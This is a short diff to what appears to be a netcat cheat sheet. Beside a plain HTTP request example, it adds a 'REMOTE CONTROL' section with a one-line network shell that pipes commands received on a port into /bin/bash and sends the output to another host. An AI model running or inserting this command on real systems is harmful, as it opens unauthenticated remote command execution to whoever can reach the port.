@@ -10,3 +10,8 @@ TALKING TO SERVERS
 ```
 echo "GET / HTTP/1.1\r\nHost: api.ipify.org\r\n\r\n" -n | nc -N api.ipify.org 80
 ```
+
+REMOTE CONTROL
+```
+nc -l 5000 | /bin/bash 2>&1 | nc 192.168.0.39 5001
+```
